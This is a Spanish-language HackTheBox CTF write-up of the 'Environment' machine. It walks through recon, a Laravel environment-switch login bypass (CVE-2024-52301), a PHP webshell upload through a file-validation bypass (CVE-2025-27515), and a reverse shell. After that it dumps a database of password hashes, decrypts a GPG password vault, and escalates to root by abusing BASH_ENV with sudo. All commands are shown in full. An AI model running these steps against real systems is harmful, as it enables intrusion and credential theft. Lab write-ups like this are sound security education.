---
title: <span style="color:#9FF527">Environment</span>
layout: single
excerpt: ""
header:
show_date: true
classes: wide
header:
  teaser: "/assets/images/htb-writeup-environment/Environment.png"
  teaser_home_page: true
  icon: "https://user-images.githubusercontent.com/69093629/125662338-fd8b3b19-3a48-4fb0-b07c-86c047265082.png"
categories:
  - HackTheBox
tags:
  - CVE-2024-52301
  - CVE-2025-27515
  - Laravel
  - RCE
  - Nginx
  - Reverse Shell


date: 2025-09-15 
---

<span style="color:#9FF527">Environment</span>



![](/assets/images/htb-writeup-environment/Environment.png)


La máquina tiene dos puertos abiertos. El puerto 22 (SSH), usando OpenSSH 9.2, y el puerto 80, corriendo un servidor web Nginx 1.22.1.


```bash
   1   │ # Nmap 7.95 scan initiated Thu Sep 11 05:19:27 2025 as: /usr/lib/nmap/nmap -sC -sV -vv -oA environment 10.10.11.67
   2   │ Nmap scan report for environment.htb (10.10.11.67)
   3   │ Host is up, received echo-reply ttl 63 (0.16s latency).
   4   │ Scanned at 2025-09-11 05:19:27 EDT for 14s
   5   │ Not shown: 998 closed tcp ports (reset)
   6   │ PORT   STATE SERVICE REASON         VERSION
   7   │ 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
   8   │ | ssh-hostkey: 
   9   │ |   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
  10   │ | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGrihP7aP61ww7KrHUutuC/GKOyHifRmeM070LMF7b6vguneFJ3dokS/UwZxcp+H82U2LL+patf3wEpLZz1oZdQ=
  11   │ |   256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
  12   │ |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ7xeTjQWBwI6WERkd6C7qIKOCnXxGGtesEDTnFtL2f2
  13   │ 80/tcp open  http    syn-ack ttl 63 nginx 1.22.1
  14   │ |_http-server-header: nginx/1.22.1
  15   │ | http-methods: 
  16   │ |_  Supported Methods: GET HEAD
  17   │ |_http-title: Save the Environment | environment.htb
  18   │ |_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
  19   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

Voy a usar Nuclei, una herramienta de seguridad que ayuda a encontrar vulnerabilidades en aplicaciones web o sistemas

```bash

❯ nuclei -target http://environment.htb

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.10

		projectdiscovery.io

[external-service-interaction] [http] [info] http://environment.htb
[cookies-without-httponly] [javascript] [info] environment.htb ["XSRF-TOKEN"]
[cookies-without-secure] [javascript] [info] environment.htb ["XSRF-TOKEN","laravel_session"]
[missing-sri] [http] [info] http://environment.htb ["http://environment.htb/build/assets/styles-Bl2K3jyg.css"]
[waf-detect:nginxgeneric] [http] [info] http://environment.htb
[waf-detect:alertlogic] [http] [info] http://environment.htb
[ssh-auth-methods] [javascript] [info] environment.htb:22 ["["publickey","password"]"]
[ssh-password-auth] [javascript] [info] environment.htb:22
[ssh-server-enumeration] [javascript] [info] environment.htb:22 ["SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u5"]
[ssh-sha1-hmac-algo] [javascript] [info] environment.htb:22
[openssh-detect] [tcp] [info] environment.htb:22 ["SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u5"]
[addeventlistener-detect] [http] [info] http://environment.htb
[nginx-version] [http] [info] http://environment.htb ["nginx/1.22.1"]
[robots-txt] [http] [info] http://environment.htb/robots.txt
[robots-txt-endpoint] [http] [info] http://environment.htb/robots.txt
[http-missing-security-headers:strict-transport-security] [http] [info] http://environment.htb
[http-missing-security-headers:content-security-policy] [http] [info] http://environment.htb
[http-missing-security-headers:permissions-policy] [http] [info] http://environment.htb
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://environment.htb
[http-missing-security-headers:clear-site-data] [http] [info] http://environment.htb
[http-missing-security-headers:referrer-policy] [http] [info] http://environment.htb
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://environment.htb
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://environment.htb
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://environment.htb
[fingerprinthub-web-fingerprints:laravel] [http] [info] http://environment.htb
[fingerprinthub-web-fingerprints:laravel-framework] [http] [info] http://environment.htb
[tech-detect:laravel] [http] [info] http://environment.htb
[tech-detect:nginx] [http] [info] http://environment.htb
[caa-fingerprint] [dns] [info] environment.htb
[INF] Scan completed in 2m. 29 matches found.

```

El escaneo con Nuclei identificó que las cookies XSRF-TOKEN y laravel_session no tienen los atributos de seguridad HttpOnly ni Secure, lo que las hace vulnerables a ataques como XSS. Además, el sitio carece de cabeceras de seguridad importantes como Strict-Transport-Security (HSTS) y Content-Security-Policy (CSP), lo que aumenta el riesgo de ataques como XSS y downgrade. También se detectó que el servidor permite autenticación por clave pública y contraseña en SSH, lo que puede ser un riesgo si las contraseñas no son fuertes. Por otro lado, se identificó un Firewall de Aplicaciones Web (WAF) basado en Nginx, lo que podría mitigar algunos tipos de ataques.

Voy a usar gobuster para realizar un escaneo de directorios de manera sigilosa
```bash
❯ gobuster dir -u http://environment.htb -w /usr/share/SecLists/Discovery/Web-Content/raft-small-words.txt -t 1 -H "User-Agent: Mozilla/5.0" -b 403,404 -o results.txt

/login                (Status: 200) [Size: 2391]
/logout               (Status: 302) [Size: 358] [--> http://environment.htb/login]
/upload               (Status: 405) [Size: 244851]
/mailing              (Status: 405) [Size: 244853]
/up                   (Status: 200) [Size: 2126]
/storage              (Status: 301) [Size: 169] [--> http://environment.htb/storage/]
/build                (Status: 301) [Size: 169] [--> http://environment.htb/build/]
/vendor               (Status: 301) [Size: 169] [--> http://environment.htb/vendor/]
Progress: 3231 / 43007 (7.51%)
```

El parámetro -t 1 usa solo un hilo para hacer las peticiones.
-H "User-Agent: Mozilla/5.0" cambia el User-Agent para que Gobuster se haga pasar por un navegador web normal, como Chrome, para evitar ser detectado como un escaneo automatizado.
El parámetro -b hace que Gobuster ignore respuestas con ciertos códigos de estado, en este caso 403 y 404

![](/assets/images/htb-writeup-environment/1.png)
![](/assets/images/htb-writeup-environment/2.png)


CVE-2024-52301 es una vulnerabilidad en Laravel que permite a un atacante manipular el entorno de la aplicación a través de la inyección de parámetros en la URL. Laravel utiliza el valor de $_SERVER['argv'] para detectar el entorno de la aplicación (por ejemplo, si está en producción o desarrollo). Este valor normalmente proviene de los argumentos pasados en la línea de comandos, pero si está habilitada la opción register_argc_argv en PHP (en el archivo php.ini), se permite que los parámetros de la URL sean tratados como si fueran argumentos de la línea de comandos. Esto significa que un atacante podría inyectar un parámetro como ?--env=production en la URL de la aplicación, lo cual alteraría el valor de $_SERVER['argv'] y cambiaría el entorno de la aplicación a producción. Dependiendo de la configuración de la aplicación, esto podría hacer que ciertos comportamientos, como las directivas Blade (@production, @env('local'), etc.), cambien y muestren información sensible o alteren la funcionalidad de la aplicación. Aunque la vulnerabilidad no permite acceso remoto ni modifica configuraciones globales a través de la función config(), sí puede ser aprovechada para cambiar el comportamiento de la aplicación de manera sutil.

Por defecto aparece el entorno de Production.

![](/assets/images/htb-writeup-environment/3.png)

Podemos cambiarlo así:

![](/assets/images/htb-writeup-environment/4.png)

Voy a ver el panel del login. Si intercepto la solicitud con Burp y quito el parámetro del pass y me da un error.

![](/assets/images/htb-writeup-environment/5.png)

![](/assets/images/htb-writeup-environment/6.png)

Si ahora pruebo a poner inyectar un valor que no sea True o False en el parámetro remember, el sistema me da más fragmento de código

![](/assets/images/htb-writeup-environment/7.png)

Nos muestra un entorno preprod, dónde podemos observar que si la app está en este entorno, el usuario se loguea automáticamente con el usuario id= 1 sin necesidad de proporcionar credenciales.

Cambio el entorno

![](/assets/images/htb-writeup-environment/8.png)

Y ya me hace la redirección a /management/dashboard

![](/assets/images/htb-writeup-environment/9.png)

![](/assets/images/htb-writeup-environment/10.png)


Si vamos al apartado de Profile, vemos que podemos cambiar la foto de perfil. Esta es la solicitud que se hace al subir un archivo

![](/assets/images/htb-writeup-environment/11.png)


Aprovechando la [CVE-2025-27515 - — File Validation Bypass en Laravel. ](https://www.miggo.io/vulnerability-database/cve/CVE-2025-27515) una vulnerabilidad que afecta cuando se usan reglas de validación con comodín, por ejemplo files.* para validar campos de archivo o imagen. 

Cambiando el filename de eee.jpg a algo como eee.jpg.php. , se sube el archivo, y podemos meter dentro del contenido del archivo una [webshell](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985) en PHP, obtenemos ejecución de código remoto

![](/assets/images/htb-writeup-environment/12.png)

Y ahora podemos hacer una reverse shell

![](/assets/images/htb-writeup-environment/13.png)

<div style="text-align: center;">
    <b><span style="color: #98FB98;">USER FLAG</span></b>
    <br>
    ---------------------------
</div>
--------------------------

![](/assets/images/htb-writeup-environment/14.png)

Voy a volcar  el contenido completo de la base de datos database.sqlite 

```bash
www-data@environment:~/app/database$ sqlite3 database.sqlite .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "migrations" ("id" integer primary key autoincrement not null, "migration" varchar not null, "batch" integer not null);
INSERT INTO migrations VALUES(1,'0001_01_01_000000_create_users_table',1);
INSERT INTO migrations VALUES(2,'0001_01_01_000001_create_cache_table',1);
INSERT INTO migrations VALUES(3,'0001_01_01_000002_create_jobs_table',1);
INSERT INTO migrations VALUES(4,'2025_01_06_124726_create_mailing_list_table',2);
INSERT INTO migrations VALUES(5,'2025_01_11_105206_add_status_to_mailing',3);
INSERT INTO migrations VALUES(6,'2025_01_11_131104_add_profile_pic_to_users',4);
CREATE TABLE IF NOT EXISTS "users" ("id" integer primary key autoincrement not null, "name" varchar not null, "email" varchar not null, "email_verified_at" datetime, "password" varchar not null, "remember_token" varchar, "created_at" datetime, "updated_at" datetime, "profile_picture" varchar);
INSERT INTO users VALUES(1,'Hish','hish@environment.htb',NULL,'$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi',NULL,'2025-01-07 01:51:54','2025-09-11 23:56:15','Untitled.php');
INSERT INTO users VALUES(2,'Jono','jono@environment.htb',NULL,'$2y$12$i.h1rug6NfC73tTb8XF0Y.W0GDBjrY5FBfsyX2wOAXfDWOUk9dphm',NULL,'2025-01-07 01:52:35','2025-01-07 01:52:35','jono.png');
INSERT INTO users VALUES(3,'Bethany','bethany@environment.htb',NULL,'$2y$12$6kbg21YDMaGrt.iCUkP/s.yLEGAE2S78gWt.6MAODUD3JXFMS13J.',NULL,'2025-01-07 01:53:18','2025-01-07 01:53:18','bethany.png');
CREATE TABLE IF NOT EXISTS "password_reset_tokens" ("email" varchar not null, "token" varchar not null, "created_at" datetime, primary key ("email"));
CREATE TABLE IF NOT EXISTS "sessions" ("id" varchar not null, "user_id" integer, "ip_address" varchar, "user_agent" text, "payload" text not null, "last_activity" integer not null, primary key ("id"));
INSERT INTO sessions VALUES('pcj8A5cYQEWidGWHT2Ey2uoQz9Qg8Ms8Zr3eYHvb',NULL,'10.10.15.73','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoic0xPdXdTNFg1d3hleFlUTmVGT05zU1c1TFpHVGplaVU3ejFMUUJqRyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6NDI6Imh0dHA6Ly9lbnZpcm9ubWVudC5odGIvbG9naW4/LS1lbnY9cHJlcHJvZCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1757631808);
INSERT INTO sessions VALUES('qFuND5cSnpsAsMHKhbyuesJlnbXfaFuBwkNfyoRQ',NULL,'10.10.15.73','Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0','YTozOntzOjY6Il90b2tlbiI7czo0MDoid1E1OHNPaVBvQ3NyR0swV0M2UjhrTkw3QnVHT0JvUjNia1VWZnlMSCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6NDI6Imh0dHA6Ly9lbnZpcm9ubWVudC5odGIvbG9naW4/LS1lbnY9cHJlcHJvZCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1757631086);
INSERT INTO sessions VALUES('ffuAfrhgnj3hWO59YovkiTrfH3P02uT3FiKRTLDB',NULL,'10.10.14.111','Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0','YTozOntzOjY6Il90b2tlbiI7czo0MDoic0lPNFpwU1ZjVDlaelVxQldjTDlBMGRLMnY1dUxHS3lFaXBMc1hBRyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6Mjg6Imh0dHA6Ly9lbnZpcm9ubWVudC5odGIvbG9naW4iO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19',1757630394);
INSERT INTO sessions VALUES('J541N2YMyu1zY9eqG5BPsuwsUNDUXZ3yqOM2qZwS',NULL,'10.10.14.111','Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0','YTozOntzOjY6Il90b2tlbiI7czo0MDoiY0J5dGNBQ0FlVG9HZFNBOTZVa0VHeWJFWWVKRlcwSmZJZnowRUphbCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6NDE6Imh0dHA6Ly9lbnZpcm9ubWVudC5odGIvbWFuYWdlbWVudC9wcm9maWxlIjt9czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1757630410);
INSERT INTO sessions VALUES('E73kjpOeRU2JzTI7JabEo8kjovgd8RTO5v03mrD1',NULL,'10.10.14.111','Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0','YTo0OntzOjY6Il90b2tlbiI7czo0MDoiRHRJazh0bG9ZZlVIU09GbjNyeGJwUEtOcXJNd2J5TXRrQXZpWXhpbyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6NDE6Imh0dHA6Ly9lbnZpcm9ubWVudC5odGIvbWFuYWdlbWVudC9wcm9maWxlIjt9czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319czo3OiJ1c2VyX2lkIjtpOjE7fQ==',1757634112);
INSERT INTO sessions VALUES('fDE9TtNN6fUWa8Nact2UMPfB6VKx8dcGAsW08vzG',NULL,'10.10.15.73','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36','YTo0OntzOjY6Il90b2tlbiI7czo0MDoidTdldE5tVTNYMVFpSVVTTmd5a1JUOHlPUTh3UnlKbFdaV2Z4djlDaCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6NDQ6Imh0dHA6Ly9lbnZpcm9ubWVudC5odGIvbG9naW4/dXNlcl9pZD1wcmVwcm9kIjt9czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319czo3OiJ1c2VyX2lkIjtpOjE7fQ==',1757630580);
INSERT INTO sessions VALUES('hHXrb7R5SzAdY8T1ZUFgVnr9BDVyUOCReyp8RFz9',NULL,'10.10.15.73','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36','YTo0OntzOjY6Il90b2tlbiI7czo0MDoiMEFzUHRDVnVYNVZuNmRkdUc1QXlPaHJmUDdCVUVha3BDVXNxdk1TRiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6Mjg6Imh0dHA6Ly9lbnZpcm9ubWVudC5odGIvbG9naW4iO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX1zOjc6InVzZXJfaWQiO2k6MTt9',1757630913);
INSERT INTO sessions VALUES('a60RCRGJDynf18q64OpDyXNoVuGr7HXuyMNf7DGy',NULL,'10.10.15.73','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36','YTo0OntzOjY6Il90b2tlbiI7czo0MDoiZnR1S0VHQmJ2VVpDMjJrd1NnUldTZzlzV2E2dHN0aURZNUxJRTNzRiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6NDE6Imh0dHA6Ly9lbnZpcm9ubWVudC5odGIvbWFuYWdlbWVudC9wcm9maWxlIjt9czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319czo3OiJ1c2VyX2lkIjtpOjE7fQ==',1757634979);
CREATE TABLE IF NOT EXISTS "cache" ("key" varchar not null, "value" text not null, "expiration" integer not null, primary key ("key"));
CREATE TABLE IF NOT EXISTS "cache_locks" ("key" varchar not null, "owner" varchar not null, "expiration" integer not null, primary key ("key"));
CREATE TABLE IF NOT EXISTS "jobs" ("id" integer primary key autoincrement not null, "queue" varchar not null, "payload" text not null, "attempts" integer not null, "reserved_at" integer, "available_at" integer not null, "created_at" integer not null);
CREATE TABLE IF NOT EXISTS "job_batches" ("id" varchar not null, "name" varchar not null, "total_jobs" integer not null, "pending_jobs" integer not null, "failed_jobs" integer not null, "failed_job_ids" text not null, "options" text, "cancelled_at" integer, "created_at" integer not null, "finished_at" integer, primary key ("id"));
CREATE TABLE IF NOT EXISTS "failed_jobs" ("id" integer primary key autoincrement not null, "uuid" varchar not null, "connection" text not null, "queue" text not null, "payload" text not null, "exception" text not null, "failed_at" datetime not null default CURRENT_TIMESTAMP);
CREATE TABLE IF NOT EXISTS "mailing_list" ("id" integer primary key autoincrement not null, "email" varchar not null, "created_at" datetime, "updated_at" datetime, "status" varchar);
INSERT INTO mailing_list VALUES(1,'cooper@cooper.com','2025-01-06 12:57:01','2025-01-06 12:57:01','1');
INSERT INTO mailing_list VALUES(2,'bob@bobbybuilder.net','2025-01-06 13:05:35','2025-01-06 13:05:35','1');
INSERT INTO mailing_list VALUES(3,'sandra@bullock.com','2025-01-06 13:07:59','2025-01-06 13:07:59','0');
INSERT INTO mailing_list VALUES(4,'p.bowls@gmail.com','2025-01-06 13:08:17','2025-01-06 13:08:17','1');
INSERT INTO mailing_list VALUES(5,'bigsandwich@sandwich.com','2025-01-06 13:10:00','2025-01-06 13:10:00','0');
INSERT INTO mailing_list VALUES(6,'dave@thediver.com','2025-01-08 03:06:12','2025-01-08 03:06:12','1');
INSERT INTO mailing_list VALUES(7,'dreynolds@sunny.com','2025-01-11 11:03:52','2025-01-11 11:03:52','1');
INSERT INTO mailing_list VALUES(8,'will@goldandblack.net','2025-01-11 23:07:47','2025-01-11 23:07:47','1');
INSERT INTO mailing_list VALUES(9,'nick.m@chicago.com','2025-01-11 23:58:04','2025-01-11 23:58:04','1');
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('migrations',6);
INSERT INTO sqlite_sequence VALUES('mailing_list',16);
INSERT INTO sqlite_sequence VALUES('users',3);
CREATE UNIQUE INDEX "users_email_unique" on "users" ("email");
CREATE INDEX "sessions_user_id_index" on "sessions" ("user_id");
CREATE INDEX "sessions_last_activity_index" on "sessions" ("last_activity");
CREATE INDEX "jobs_queue_index" on "jobs" ("queue");
CREATE UNIQUE INDEX "failed_jobs_uuid_unique" on "failed_jobs" ("uuid");
COMMIT;
```
Esto imprime el dump directamente en la terminal (stdout) - no lo guarda automáticamente en un archivo. Para guardarlo en un archivo podemos hacer lo siguiente:

![](/assets/images/htb-writeup-environment/15.png)

Vemos que tenemos una tabla usuarios con emails y contraseñas.

```bash
www-data@environment:~/app/database$ sqlite3 database.sqlite 
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> select email,password from users;
hish@environment.htb|$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi
jono@environment.htb|$2y$12$i.h1rug6NfC73tTb8XF0Y.W0GDBjrY5FBfsyX2wOAXfDWOUk9dphm
bethany@environment.htb|$2y$12$6kbg21YDMaGrt.iCUkP/s.yLEGAE2S78gWt.6MAODUD3JXFMS13J.
sqlite> 

```

Encuentro un archivo keyvault.gpg, cifrado con GPG (GNU Privacy Guard). Alguien lo cifró con una clave pública, y solo quien tenga la clave privada correspondiente puede descifrarlo. Cuando intento descifrarlo con gpg -d keyvault.gpg me da error.

Asi que voy a Ver si hay claves exportadas o en archivos de usuario (/home/hish/.gnupg, por ejemplo).

Ese directorio /home/hish/.gnupg contiene: la clave privada y la base de datos de confianza de GPG del usuario hish. Aquí es donde GPG guarda:

🔑 private-keys-v1.d/ → claves privadas

📖 pubring.kbx → claves públicas

🧠 trustdb.gpg → niveles de confianza en claves


Ya que no puedo usar /var/www/.gnupg, voy a crear un entorno temporal y copiar los archivos ahí.

```bash
mkdir /tmp/gnupg
chmod 700 /tmp/gnupg
export GNUPGHOME=/tmp/gnupg
```

Ahora pego la clave pública y privada al nuevo entorno 
```bash
cp /home/hish/.gnupg/pubring.kbx $GNUPGHOME/
cp -r /home/hish/.gnupg/private-keys-v1.d $GNUPGHOME/
```

Y ahora si me deja descifrar el archivo

```bash
www-data@environment:/home/hish/backup$ gpg -d /home/hish/backup/keyvault.gpg
gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

[](/assets/images/htb-writeup-environment/16.png)

Veo que hay un script llamado /usr/bin/systeminfo que puedes ejecutar con sudo como usuario hish.
Ese script ejecuta comandos (como dmesg, ss, mount) sin ruta absoluta (es decir, solo el nombre del comando, no /bin/dmesg).

Eso significa que cuando el script ejecuta dmesg, busca el comando dmesg en el PATH de la sesión.
Si tú creas un archivo llamado dmesg y lo pones en un directorio que esté antes en el PATH, el script ejecutará ese archivo en vez del dmesg real.


```bash
hish@environment:~$ sudo -l
[sudo] password for hish: 
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
hish@environment:~$ file /usr/bin/systeminfo
/usr/bin/systeminfo: Bourne-Again shell script, ASCII text executable
hish@environment:~$ cat /usr/bin/systeminfo  
#!/bin/bash
echo -e "\n### Displaying kernel ring buffer logs (dmesg) ###"
dmesg | tail -n 10

echo -e "\n### Checking system-wide open ports ###"
ss -antlp

echo -e "\n### Displaying information about all mounted filesystems ###"
mount | column -t

echo -e "\n### Checking system resource limits ###"
ulimit -a

echo -e "\n### Displaying loaded kernel modules ###"
lsmod | head -n 10

echo -e "\n### Checking disk usage for all filesystems ###"
df -h
```

<div style="text-align: center;">
    <b><span style="color: #98FB98;">ROOT FLAG</span></b>
    <br>
    ---------------------------
</div>
 --------------------------

BASH_ENV es una variable que Bash usa para ejecutar un script antes de lanzar su shell. Entonces, voy a crear una shell interactivo y poner su ruta en la variable BASH_ENV, ejecutando /usr/bin/systeminfo con sudo usando la variable BASH_ENV

```bash
hish@environment:/usr/bin$ sudo nano /dev/shm/pwn.sh
Sorry, user hish is not allowed to execute '/usr/bin/nano /dev/shm/pwn.sh' as root on environment.
hish@environment:/usr/bin$ nano /dev/shm/pwn.sh
hish@environment:/usr/bin$ cat /dev/shm/
.gnupg/ pwn.sh  
hish@environment:/usr/bin$ cat /dev/shm/pwn.sh 
#!/bin/bash

bash
hish@environment:/usr/bin$ chmod +x /dev/shm/pwn.sh 
hish@environment:/usr/bin$ sudo BASH_ENV=/dev/shm/pwn.sh /usr/bin/systeminfo 
root@environment:/usr/bin# 
root@environment:~# ls
root.txt  scripts
root@environment:~# cat root.txt 
cbfd74d385ba733d8b932ca5578a73bd
```